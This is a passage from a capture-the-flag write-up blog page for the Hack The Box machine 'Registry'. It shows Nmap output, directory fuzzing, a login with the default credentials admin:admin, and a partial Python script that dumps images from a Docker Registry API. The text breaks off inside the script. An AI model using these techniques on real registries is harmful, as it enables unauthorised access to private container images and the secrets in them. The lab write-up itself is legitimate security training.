<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="description" content="A minimal, portfolio, sidebar, bootstrap Jekyll theme with responsive web design and focuses on text presentation."><title>Hack The Box Write Up - Registry | zRyuki</title><meta name="generator" content="Jekyll v4.0.0" /><meta property="og:title" content="Hack The Box Write Up - Registry" /><meta name="author" content="zRyuki" /><meta property="og:locale" content="en_US" /><meta name="description" content="Information Gathering" /><meta property="og:description" content="Information Gathering" /><link rel="canonical" href="https://zeroryuki.github.io/posts/Registry/" /><meta property="og:url" content="https://zeroryuki.github.io/posts/Registry/" /><meta property="og:site_name" content="zRyuki" /><meta property="og:image" content="https://zeroryuki.github.io/img/registry/badge.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-04-05T00:00:00+08:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zeroryuki.github.io/img/registry/badge.png" /><meta property="twitter:title" content="Hack The Box Write Up - Registry" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@zRyuki" /><meta name="google-site-verification" content="uR4O3tdC8ptzD19y4h81kQmgw4DIjwMC-FIW5gIrfkM" /> <script type="application/ld+json"> {"headline":"Hack The Box Write Up - Registry","dateModified":"2020-04-05T00:00:00+08:00","datePublished":"2020-04-05T00:00:00+08:00","author":{"@type":"Person","name":"zRyuki"},"description":"Information Gathering","mainEntityOfPage":{"@type":"WebPage","@id":"https://zeroryuki.github.io/posts/Registry/"},"image":"https://zeroryuki.github.io/img/registry/badge.png","@type":"BlogPosting","url":"https://zeroryuki.github.io/posts/Registry/","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/icons.css"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/custom.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><meta content="zRyuki" property="og:site_name"><meta content="Hack The Box Write Up - Registry" property="og:title"><meta content="article" property="og:type"><meta content="A minimal, portfolio, sidebar, bootstrap Jekyll theme with responsive web design and focuses on text presentation." property="og:description"><meta content="https://zeroryuki.github.io/posts/Registry/" property="og:url"><meta content="2020-04-05T00:00:00+08:00" property="article:published_time"><meta content="https://zeroryuki.github.io/about/" property="article:author"><meta content="https://zeroryuki.github.io/img/registry/badge.png" property="og:image"><meta content="machine" property="article:section"><meta content="htb" property="article:tag"><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="https://avatars2.githubusercontent.com/u/34531838" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">zRyuki</a></div><div id="site-subtitle" class="font-italic">Systems were built to be owned</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/zeroryuki" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['zeroryuki','gmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" target="_blank"> <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box Write Up - Registry</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box Write Up - Registry</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 5, 2020, 12:00 AM +0800"> Apr 5, 2020 <i class="unloaded">2020-04-05T00:00:00+08:00</i> </span> by <span class="author"> zRyuki </span></div></div><div class="row"><div class="col-lg-6"> <img src="/img/registry/icon.png"></div><div class="col-lg-5"><h2 data-toc-skip class="text-center">registry</h2><p></p><table class="table table-hover table-striped"><tbody><tr><td class="text-right">OS:<td> <img src="/img/Linux.png" height="15"> Linux<tr><td class="text-right">Difficulty:<td> <span class="text-danger bold"> Hard</span><tr><td class="text-right">Points:<td><span class="text-success">40</span><tr><td class="text-right">Release:<td>19 Oct 2019<tr><td class="text-right">IP:<td>10.10.10.159</table></div></div><div class="post-content"><h2 id="information-gathering">Information Gathering</h2><h3 id="nmap">Nmap</h3><p>We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80SVN scan initiated Thu Dec 12 22:18:37 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/z3r0/CTF/HTB/Machine/Registry/scans/_quick_tcp_nmap.txt -oX /home/z3r0/CTF/HTB/Machine/Registry/scans/xml/_quick_tcp_nmap.xml 10.10.10.159</span>
Increasing send delay <span class="k">for </span>10.10.10.159 from 0 to 5 due to 11 out of 24 dropped probes since last increase.
Nmap scan report <span class="k">for </span>10.10.10.159
Host is up, received user-set <span class="o">(</span>0.37s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2019-12-12 22:18:38 +08 <span class="k">for </span>95s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCZtxPox0F/6ZQbPbgwP9t13ZX+DegufV+sVoqTGWfuE2/jQwVLR+TCLJM4EDg4UJol4OHl0ATQBkPM7CSi1DS3oZgNlaASXQoZFzHUN4KF1/B6uShfMcszORHOBSRZAMe5nuesre2oJtrqhyO1VS2TMOitFLmKEaDImHy7EXe8qnaK8CrVFAxdUOG8iQFEiZUt8JZJ6CPgfIu00t4JpIl9l4aOFEZT6H7xf7K74ov2KNyP6WCoOtdDf7Rhfwcfo6dogHxssH6O/d+FgN6KJ8q2gJjUZVYYjZHTfGCPRukmSDYQNglQkvzuOy3umUTwNt5NdjYBT+vemcOIaDPm0SX
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDFZI3tSfqp1WJF1TjoPa3J6j94yzXZMtFj92P8HcBUXCosmhsTsRa5rBvt20Es/qTp2otqYz3R3jf9O0OGC/tc<span class="o">=</span>
|   256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINNAMP4YFJGAx3ip1MPEsDuXUhgHXOIxrVTUCOxqJeRr
80/tcp  open  http     syn-ack nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to nginx!
443/tcp open  ssl/http syn-ack nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>docker.registry.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>Registry
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
| <span class="nt">-----BEGIN</span> CERTIFICATE-----
| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
| <span class="nv">PEyspHOCbg1C6a0gI1xo0c0</span><span class="o">=</span>
|_-----END CERTIFICATE-----
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Thu Dec 12 22:20:13 2019 -- 1 IP address (1 host up) scanned in 96.65 seconds</span>
</pre></table></code></div></div><p>Open Port: <strong>22,80,443</strong> Interesting subdomain name: docker.registry.htb</p><p>So lets put <strong>registry.htb</strong> and <strong>docker.registry.htb</strong> to <strong>/etc/hosts</strong></p><h3 id="website---registryhtb">Website - registry.htb</h3><p>The frontpage of the website, hmm..</p><p><img src="/img/registry/2020-04-04-11-22-09.png" alt="" /></p><p>Lets fuzz the dir to get valid page. Using dirbuster for common dir name</p><p><img src="/img/registry/2020-04-04-11-21-07.png" alt="" /></p><p>Lets take a look</p><h4 id="install">install</h4><p><img src="/img/registry/2020-04-04-11-20-11.png" alt="" /></p><h4 id="bolt">bolt</h4><p><img src="/img/registry/2020-04-04-11-16-47.png" alt="" /></p><p>Ok hit a page with some interface. On this point, i simply check all the pages and links, but returned 404 error. I’m thinking of fuzzing the dir name again, with gobuster again.</p><p><img src="/img/registry/2020-04-04-13-38-30.png" alt="" /></p><p>with the result, i tried all the dir names again, and got 403 error except bolt dir. It redirects me to login page. Interesting</p><p><img src="/img/registry/2020-04-04-13-40-03.png" alt="" /></p><p>there should be key to get in. Maybe try look at the other host.</p><h3 id="website---dockerregistryhtb">Website - docker.registry.htb</h3><p>I start to fuzzing the site with gobuster to get valid dirname.</p><p><img src="/img/registry/2020-04-04-14-21-09.png" alt="" /></p><p>Got v2 dir.</p><h4 id="http-auth">HTTP Auth</h4><p>Accessing v2 page, prompted with HTTP Auth box</p><p><img src="/img/registry/2020-04-04-14-36-18.png" alt="" /></p><p>Just using common credential admin:admin, im authenticated and redirected to page with empty response output. Looks like some api endpoint page.</p><p><img src="/img/registry/2020-04-04-14-39-19.png" alt="" /></p><p>Quick search in google with key <strong>docker v2</strong>, return interesting info about <code class="highlighter-rouge">Docker Registry HTTP API V2</code></p><h4 id="dockerfetcher-script">Dockerfetcher script</h4><p>With docker registry api information, im thinking on searching for docker registry api script, and stumbled on python script</p><p><strong><em>dockerfetch</em></strong></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
</pre><td class="rouge-code"><pre>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">optparse</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="c1"># pulls Docker Images from unauthenticated docker registry api. 
# and checks for docker misconfigurations. 
</span>
<span class="n">apiversion</span> <span class="o">=</span> <span class="s">"v2"</span>
<span class="n">final_list_of_blobs</span> <span class="o">=</span> <span class="p">[]</span>

	
<span class="c1"># Disable insecure request warning 
</span><span class="kn">from</span> <span class="nn">requests.packages.urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">optparse</span><span class="p">.</span><span class="n">OptionParser</span><span class="p">()</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">'-u'</span><span class="p">,</span> <span class="s">'--url'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"url"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"URL Endpoint for Docker Registry API v2. Eg https://IP:Port"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">"spam"</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">'-a'</span><span class="p">,</span> <span class="s">'--authorization'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="s">"Found in the header prequest params (Authorization ) its an base64 user:password encode"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
<span class="n">options</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">options</span><span class="p">.</span><span class="n">url</span>
<span class="n">header</span> <span class="o">=</span> <span class="n">options</span><span class="p">.</span><span class="n">authorization</span>

<span class="k">def</span> <span class="nf">list_repos</span><span class="p">():</span>
        <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">apiversion</span> <span class="o">+</span> <span class="s">"/_catalog"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Authorization'</span><span class="p">:</span> <span class="n">header</span><span class="p">},</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">"repositories"</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">find_tags</span><span class="p">(</span><span class="n">reponame</span><span class="p">):</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">apiversion</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">reponame</span><span class="o">+</span><span class="s">"/tags/list"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Authorization'</span><span class="p">:</span> <span class="n">header</span><span class="p">},</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="si">\</span><span class="se">n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">data</span> <span class="o">=</span>  <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
	<span class="k">if</span> <span class="s">"tags"</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="s">"tags"</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">list_blobs</span><span class="p">(</span><span class="n">reponame</span><span class="p">,</span><span class="n">tag</span><span class="p">):</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">apiversion</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">reponame</span><span class="o">+</span><span class="s">"/manifests/"</span> <span class="o">+</span> <span class="n">tag</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Authorization'</span><span class="p">:</span> <span class="n">header</span><span class="p">},</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
	<span class="k">if</span> <span class="s">"fsLayers"</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
		<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="s">"fsLayers"</span><span class="p">]:</span>
			<span class="n">curr_blob</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="s">'blobSum'</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
			<span class="k">if</span> <span class="n">curr_blob</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">final_list_of_blobs</span><span class="p">:</span>
				<span class="n">final_list_of_blobs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">curr_blob</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">download_blobs</span><span class="p">(</span><span class="n">reponame</span><span class="p">,</span> <span class="n">blobdigest</span><span class="p">,</span><span class="n">dirname</span><span class="p">):</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">apiversion</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">reponame</span> <span class="o">+</span><span class="s">"/blobs/sha256:"</span> <span class="o">+</span> <span class="n">blobdigest</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Authorization'</span><span class="p">:</span> <span class="n">header</span><span class="p">},</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="n">filename</span> <span class="o">=</span> <span class="s">"%s.tar.gz"</span> <span class="o">%</span> <span class="n">blobdigest</span>
	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">dirname</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">filename</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">test</span><span class="p">:</span>
		<span class="n">test</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span> 
	<span class="k">if</span> <span class="n">url</span> <span class="ow">is</span> <span class="ow">not</span> <span class="s">"spam"</span><span class="p">:</span>
		<span class="n">list_of_repos</span> <span class="o">=</span> <span class="n">list_repos</span><span class="p">()</span>
		<span class="k">print</span> <span class="s">"</span><span class="si">\</span><span class="se">n</span><span class="s">[+] List of Repositories:</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
		<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">list_of_repos</span><span class="p">:</span>
			<span class="k">print</span> <span class="n">x</span>
		<span class="n">target_repo</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"</span><span class="si">\</span><span class="se">n</span><span class="s">Which repo would you like to download?:  "</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">target_repo</span> <span class="ow">in</span> <span class="n">list_of_repos</span><span class="p">:</span>
			<span class="n">tags</span> <span class="o">=</span> <span class="n">find_tags</span><span class="p">(</span><span class="n">target_repo</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">tags</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
				<span class="k">print</span> <span class="s">"</span><span class="si">\</span><span class="se">n</span><span class="s">[+] Available Tags:</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
				<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">tags</span><span class="p">:</span>
					<span class="k">print</span> <span class="n">x</span>

				<span class="n">target_tag</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"</span><span class="si">\</span><span class="se">n</span><span class="s">Which tag would you like to download?:  "</span><span class="p">)</span>
